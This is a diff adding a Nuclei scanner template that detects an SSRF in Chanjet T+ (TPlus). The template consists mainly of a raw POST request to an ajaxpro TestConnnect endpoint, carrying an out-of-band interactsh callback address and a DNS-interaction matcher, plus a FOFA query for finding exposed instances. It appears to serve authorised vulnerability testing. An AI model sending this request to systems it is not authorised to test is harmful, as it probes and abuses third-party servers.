@@ -1,0 +1,40 @@
+id: chanjet-tplus-ssrf
+
+info:
+  name: Chanjet Tplus - SSRF
+  author: qwtd
+  severity: high
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%E7%95%85%E6%8D%B7%E9%80%9A-TPlus%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3ajaxpro%E5%AD%98%E5%9C%A8ssrf%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="畅捷通-TPlus"
+  tags: 畅捷通-TPlus
+
+http:
+  - raw:
+      - |
+        POST /tplus/ajaxpro/Ufida.T.SM.UIP.UA.AddressSettingController,Ufida.T.SM.UIP.ashx?method=TestConnnect HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Cookie: ASP.NET_SessionId=sfzg0pgxvld3ltgimecqkjg4; Hm_lvt_fd4ca40261bc424e2d120b806d985a14=1721822405; Hm_lpvt_fd4ca40261bc424e2d120b806d985a14=1721822415; HMACCOUNT=AFE08148BD092161
+        Upgrade-Insecure-Requests: 1
+        Priority: u=0, i
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 36
+
+        {
+          "address":"{{interactsh-url}}"
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
